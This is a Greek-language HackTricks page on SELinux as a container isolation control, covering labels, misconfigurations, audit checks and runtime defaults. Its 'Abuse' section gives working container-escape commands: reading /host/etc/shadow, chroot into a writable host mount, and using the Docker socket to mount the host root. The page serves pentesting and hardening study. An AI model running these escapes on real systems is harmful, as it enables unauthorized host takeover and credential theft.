# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

Το SELinux είναι ένα σύστημα **Mandatory Access Control βασισμένο σε labels**. Κάθε σχετική διεργασία και αντικείμενο μπορεί να διαθέτει security context, και η policy αποφασίζει ποια domains μπορούν να αλληλεπιδρούν με ποιους types και με ποιον τρόπο. Σε περιβάλλοντα με containers, αυτό συνήθως σημαίνει ότι το runtime εκκινεί τη διεργασία του container μέσα σε ένα περιορισμένο container domain και προσθέτει στα περιεχόμενα του container τα αντίστοιχα labels. Αν η policy λειτουργεί σωστά, η διεργασία μπορεί να διαβάζει και να γράφει τα στοιχεία στα οποία αναμένεται να έχει πρόσβαση βάσει του label της, ενώ η πρόσβαση σε άλλο περιεχόμενο του host απορρίπτεται, ακόμη και αν αυτό το περιεχόμενο γίνει ορατό μέσω ενός mount.

Αυτή είναι μία από τις ισχυρότερες protections στην πλευρά του host που είναι διαθέσιμες σε mainstream Linux container deployments. Είναι ιδιαίτερα σημαντική σε Fedora, RHEL, CentOS Stream, OpenShift και άλλα SELinux-centric οικοσυστήματα. Σε αυτά τα περιβάλλοντα, ένας reviewer που αγνοεί το SELinux συχνά θα παρερμηνεύσει τον λόγο για τον οποίο ένα προφανές path προς compromise του host στην πραγματικότητα αποκλείεται.

## AppArmor Vs SELinux

Η ευκολότερη διαφορά σε υψηλό επίπεδο είναι ότι το AppArmor είναι path-based, ενώ το SELinux είναι **label-based**. Αυτό έχει σημαντικές συνέπειες για την ασφάλεια των containers. Μία path-based policy μπορεί να συμπεριφέρεται διαφορετικά αν το ίδιο περιεχόμενο του host γίνει ορατό κάτω από ένα μη αναμενόμενο mount path. Μία label-based policy, αντίθετα, εξετάζει ποιο label έχει το αντικείμενο και τι μπορεί να κάνει σε αυτό το process domain. Αυτό δεν κάνει το SELinux απλό, αλλά το καθιστά ανθεκτικό απέναντι σε μία κατηγορία assumptions που βασίζονται σε path tricks και τα οποία οι defenders μερικές φορές κάνουν κατά λάθος σε συστήματα βασισμένα στο AppArmor.

Επειδή το μοντέλο είναι προσανατολισμένο στα labels, ο χειρισμός των volumes των containers και οι αποφάσεις για relabeling είναι κρίσιμες για την ασφάλεια. Αν το runtime ή ο operator αλλάξει τα labels υπερβολικά ευρέως για να "κάνει τα mounts να λειτουργούν", το όριο της policy που προοριζόταν να περιορίζει το workload μπορεί να γίνει πολύ ασθενέστερο από όσο προβλεπόταν.

## Lab

Για να δείτε αν το SELinux είναι ενεργό στον host:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Για να επιθεωρήσετε τις υπάρχουσες ετικέτες στον host:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Για να συγκρίνετε μια κανονική εκτέλεση με μία όπου η επισήμανση είναι απενεργοποιημένη:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Σε έναν host με ενεργοποιημένο SELinux, αυτή είναι μια πολύ πρακτική επίδειξη, επειδή δείχνει τη διαφορά μεταξύ ενός workload που εκτελείται υπό το αναμενόμενο container domain και ενός workload από το οποίο έχει αφαιρεθεί αυτό το επίπεδο enforcement.

## Χρήση Runtime

Το Podman είναι ιδιαίτερα καλά ευθυγραμμισμένο με το SELinux σε συστήματα όπου το SELinux αποτελεί προεπιλογή της πλατφόρμας. Το Rootless Podman μαζί με το SELinux είναι ένα από τα ισχυρότερα mainstream container baselines, επειδή η διεργασία είναι ήδη unprivileged στην πλευρά του host και εξακολουθεί να περιορίζεται από MAC policy. Το Docker μπορεί επίσης να χρησιμοποιεί SELinux όπου υποστηρίζεται, αν και οι administrators μερικές φορές το απενεργοποιούν για να παρακάμψουν προβλήματα με το volume-labeling. Τα CRI-O και OpenShift βασίζονται σε μεγάλο βαθμό στο SELinux ως μέρος του container isolation story τους. Το Kubernetes μπορεί επίσης να εκθέτει ρυθμίσεις σχετικές με το SELinux, όμως η αξία τους εξαρτάται προφανώς από το αν το OS του node υποστηρίζει και επιβάλλει πράγματι το SELinux.<sup>[[2]](#references)</sup>

Το επαναλαμβανόμενο lesson είναι ότι το SELinux δεν είναι προαιρετική διακόσμηση. Στα ecosystems που έχουν σχεδιαστεί γύρω από αυτό, αποτελεί μέρος του αναμενόμενου security boundary.

## Λανθασμένες ρυθμίσεις

Το κλασικό λάθος είναι το `label=disable`. Σε επίπεδο λειτουργίας, αυτό συμβαίνει συχνά επειδή ένα volume mount απορρίφθηκε και η γρηγορότερη βραχυπρόθεσμη λύση ήταν να αφαιρεθεί το SELinux από την εξίσωση, αντί να διορθωθεί το labeling model.<sup>[[1]](#references)</sup> Ένα ακόμη συνηθισμένο λάθος είναι το εσφαλμένο relabeling περιεχομένου του host. Οι ευρείες relabel operations μπορεί να κάνουν την εφαρμογή να λειτουργήσει, αλλά μπορούν επίσης να επεκτείνουν όσα επιτρέπεται να αγγίξει το container πολύ πέρα από τον αρχικό σκοπό.

Είναι επίσης σημαντικό να μη συγχέουμε το **installed** SELinux με το **effective** SELinux. Ένας host μπορεί να υποστηρίζει SELinux και παρ’ όλα αυτά να βρίσκεται σε permissive mode, ή το runtime μπορεί να μην εκκινεί το workload υπό το αναμενόμενο domain. Σε αυτές τις περιπτώσεις, η προστασία είναι πολύ ασθενέστερη από ό,τι μπορεί να υποδηλώνει η τεκμηρίωση.

## Abuse

Όταν το SELinux απουσιάζει, βρίσκεται σε permissive mode ή έχει απενεργοποιηθεί ευρέως για το workload, τα host-mounted paths γίνονται πολύ ευκολότερο να γίνουν αντικείμενο abuse. Το ίδιο bind mount που διαφορετικά θα περιοριζόταν από labels μπορεί να μετατραπεί σε άμεση οδό προς δεδομένα του host ή προς τροποποίηση του host. Αυτό είναι ιδιαίτερα σημαντικό όταν συνδυάζεται με writable volume mounts, container runtime directories ή operational shortcuts που εκθέτουν ευαίσθητα host paths για λόγους ευκολίας.

Το SELinux συχνά εξηγεί γιατί ένα generic breakout writeup λειτουργεί άμεσα σε έναν host αλλά αποτυγχάνει επανειλημμένα σε έναν άλλο, παρόλο που τα runtime flags φαίνονται παρόμοια. Το στοιχείο που λείπει συχνά δεν είναι namespace ή capability, αλλά ένα label boundary που παρέμεινε άθικτο.

Ο ταχύτερος πρακτικός έλεγχος είναι να συγκρίνετε το active context και στη συνέχεια να ελέγξετε mounted host paths ή runtime directories που κανονικά θα περιορίζονταν από labels:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Εάν υπάρχει host bind mount και το SELinux labeling έχει απενεργοποιηθεί ή αποδυναμωθεί, συνήθως προηγείται η αποκάλυψη πληροφοριών:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Αν το mount είναι writable και το container είναι ουσιαστικά host-root από την οπτική γωνία του kernel, το επόμενο βήμα είναι να δοκιμάσετε ελεγχόμενη τροποποίηση του host αντί να κάνετε εικασίες:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Σε hosts με υποστήριξη SELinux, η απώλεια labels γύρω από καταλόγους κατάστασης runtime μπορεί επίσης να εκθέσει άμεσες διαδρομές privilege-escalation:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Οι παρακάτω εντολές δεν αντικαθιστούν μια πλήρη αλυσίδα escape, αλλά δείχνουν πολύ γρήγορα αν το SELinux ήταν αυτό που εμπόδιζε την πρόσβαση σε δεδομένα του host ή την τροποποίηση αρχείων στην πλευρά του host.

### Πλήρες Παράδειγμα: Το SELinux είναι Απενεργοποιημένο + Εγγράψιμο Host Mount

Αν το SELinux labeling είναι απενεργοποιημένο και το filesystem του host έχει γίνει writable mount στο `/host`, ένα πλήρες host escape γίνεται μια συνηθισμένη περίπτωση abuse bind-mount:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Εάν το `chroot` ολοκληρωθεί με επιτυχία, η διεργασία του container λειτουργεί πλέον από το filesystem του host:
```bash
id
hostname
cat /etc/passwd | tail
```
### Πλήρες Παράδειγμα: Το SELinux Απενεργοποιημένο + Runtime Directory

Αν το workload μπορεί να προσπελάσει ένα runtime socket όταν τα labels είναι απενεργοποιημένα, το escape μπορεί να ανατεθεί στο runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
Η σχετική παρατήρηση είναι ότι το SELinux συχνά αποτελούσε το μέτρο ελέγχου που απέτρεπε ακριβώς αυτού του είδους την πρόσβαση σε host-path ή runtime-state.

## Έλεγχοι

Ο στόχος των ελέγχων του SELinux είναι να επιβεβαιωθεί ότι το SELinux είναι ενεργοποιημένο, να εντοπιστεί το τρέχον security context και να διαπιστωθεί αν τα αρχεία ή τα paths που σας ενδιαφέρουν περιορίζονται πράγματι μέσω labels.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Τι είναι ενδιαφέρον εδώ:

- Το `getenforce` ιδανικά θα πρέπει να επιστρέφει `Enforcing`· οι τιμές `Permissive` ή `Disabled` αλλάζουν το νόημα ολόκληρης της ενότητας SELinux.
- Αν το context της τρέχουσας διεργασίας φαίνεται απρόσμενο ή υπερβολικά ευρύ, το workload ενδέχεται να μην εκτελείται με την προβλεπόμενη πολιτική container.
- Αν τα αρχεία που έχουν γίνει mount από το host ή οι κατάλογοι runtime διαθέτουν labels στα οποία η διεργασία μπορεί να έχει υπερβολικά ελεύθερη πρόσβαση, τα bind mounts γίνονται πολύ πιο επικίνδυνα.

Κατά την εξέταση ενός container σε πλατφόρμα με υποστήριξη SELinux, μην αντιμετωπίζετε το labeling ως δευτερεύουσα λεπτομέρεια. Σε πολλές περιπτώσεις αποτελεί έναν από τους βασικούς λόγους για τους οποίους το host δεν έχει ήδη παραβιαστεί.

## Προεπιλογές Runtime

| Runtime / πλατφόρμα | Προεπιλεγμένη κατάσταση | Προεπιλεγμένη συμπεριφορά | Συνήθης χειροκίνητη αποδυνάμωση |
| --- | --- | --- | --- |
| Docker Engine | Εξαρτάται από το host | Ο διαχωρισμός SELinux είναι διαθέσιμος σε hosts με ενεργοποιημένο SELinux, αλλά η ακριβής συμπεριφορά εξαρτάται από τη διαμόρφωση του host/daemon | `--security-opt label=disable`, ευρύ relabeling των bind mounts, `--privileged` |
| Podman | Συνήθως ενεργοποιημένο σε hosts με SELinux | Ο διαχωρισμός SELinux αποτελεί κανονικό μέρος του Podman σε συστήματα SELinux, εκτός αν απενεργοποιηθεί | `--security-opt label=disable`, `label=false` στο `containers.conf`, `--privileged` |
| Kubernetes | Γενικά δεν εκχωρείται αυτόματα σε επίπεδο Pod | Η υποστήριξη SELinux υπάρχει, αλλά τα Pods συνήθως χρειάζονται `securityContext.seLinuxOptions` ή προεπιλογές ειδικές για την πλατφόρμα· απαιτείται υποστήριξη από το runtime και τον node | αδύναμες ή υπερβολικά ευρείες `seLinuxOptions`, εκτέλεση σε nodes με permissive/disabled SELinux, policies της πλατφόρμας που απενεργοποιούν το labeling |
| CRI-O / deployments τύπου OpenShift | Συνήθως χρησιμοποιείται σε μεγάλο βαθμό | Το SELinux αποτελεί συχνά βασικό μέρος του μοντέλου απομόνωσης των nodes σε αυτά τα περιβάλλοντα | custom policies που διευρύνουν υπερβολικά την πρόσβαση, απενεργοποίηση του labeling για λόγους συμβατότητας |

Οι προεπιλογές του SELinux εξαρτώνται περισσότερο από τη διανομή σε σχέση με τις προεπιλογές του seccomp. Σε συστήματα τύπου Fedora/RHEL/OpenShift, το SELinux αποτελεί συχνά κεντρικό μέρος του μοντέλου απομόνωσης. Σε συστήματα χωρίς SELinux, απλώς απουσιάζει.

## Αναφορές

- [1] [Τεκμηρίωση Podman: --security-opt=option (label=disable)](https://docs.podman.io/en/v4.6.0/markdown/options/security-opt.html)
- [2] [Kubernetes: Διαμόρφωση Security Context για Pod ή Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

{{#include ../../../../banners/hacktricks-training.md}}
